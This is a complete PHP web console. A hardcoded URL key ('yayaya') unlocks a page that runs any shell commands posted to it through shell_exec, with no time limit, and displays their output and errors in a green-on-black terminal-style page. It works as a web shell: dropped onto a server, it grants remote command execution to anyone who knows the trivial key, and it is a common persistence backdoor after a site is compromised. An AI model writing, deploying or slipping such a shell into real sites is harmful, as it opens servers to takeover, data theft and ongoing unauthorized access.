<?php
	define('MAGIC_CONSOLE_KEY', 'yayaya'); // this is the magic key to get the console!
	@set_time_limit(0);
	@ini_set('max_execution_time', 0);
	if (!(isset($_GET['key']) && $_GET['key'] === MAGIC_CONSOLE_KEY)) die('no! no-no noo!');
	if (isset($_POST['input'], $_POST['stderr'])) {
		$a = '';
		$cmds = explode("\n", $_POST['input']);
		foreach($cmds as $cmd) {
			if ($_POST['stderr'] && strpos($cmd, '2>&1') == FALSE) $cmd .= ' 2>&1';
			$a .= shell_exec($cmd);
		}
		$a = str_replace("\n", "<br>\n", $a);
		echo $a;
		exit;
	}
?>

<!DOCTYPE HTML>
<html>
<!--

	###########################################################
	#                                                         #
	#  THIS CONSOLE IS ONLY SUPPORTED ON NEW MODERN BROWSERS  #
	#                                                         #
	###########################################################

-->
<head>
	<meta charset="utf-8" />
	<title>Console</title>
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

	<script>
		$(document).ready(function(){
			$('#reset').click(function(){ $('#input').val(''); });
			$('#send').click(function(){
				$('#input, #send').prop('disabled', true);
				var input = $('#input').val(),
					stderr = $('#stderr').prop('checked')?1:0;
				$.ajax({
					type: 'post',
					data: {
						input: input,
						stderr: stderr
					},
					success: function(res) {
						$('#answer').html(res);
						$('#input, #send').prop('disabled', false);
						$('#input').focus();
					}
				});
			});
			$('#input').keypress(function (e) {
				if (e.keyCode == 13 && e.shiftKey) {
					e.preventDefault();
					$('#send').click();
				}
			});
			$('.changeFontSize').click(function() {
				$('.codeblock').css('font-size', (+$('.codeblock').css('font-size').replace('px', '')) + ($(this).attr('data-inc') === "1" ? 2 : -2) + "px");
			});
		});
	</script>
	<style>
		body { background: #000; }
		button { margin: 3px; }
		label { color: #fff; }
		#input {
			width: 100%;
			height: 250px;
			resize: none;
		}
		#answer {
			margin-top: 10px;
			border: 1px solid gray;
			width: 100%;
			min-height: 250px;
			overflow: auto;
		}
		.codeblock {
			background: #000;
			color: #0f0;
			font-family: Courier, monospace;
			font-size: 14px;
		}
		.fontChangerSymbol {
			color: red;
			font-weight: bolder;
		}
		.changeFontSizeBtn { float: right; }
		.clear { clear: both; }
	</style>

</head>
<body>
    <textarea id="input" class="codeblock" placeholder="&gt; Enter the console commands here"></textarea>
	<div>
		<button id="reset">Clear input</button>
		<button id="send">Send (Shift-Enter)</button>
		<input type="checkbox" id="stderr" name="stderr" checked><label for="stderr">Display stderr</label>
		<button class="changeFontSizeBtn" data-inc="1"><span class="fontChangerSymbol">+</span> font size</button>
		<button class="changeFontSizeBtn" data-inc="0"><span class="fontChangerSymbol">-</span> font size</button>
		<div class="clear"></div>
	</div>
	<div id="answer" class="codeblock">&gt; Output will be shown here</div>
</body>
</html>
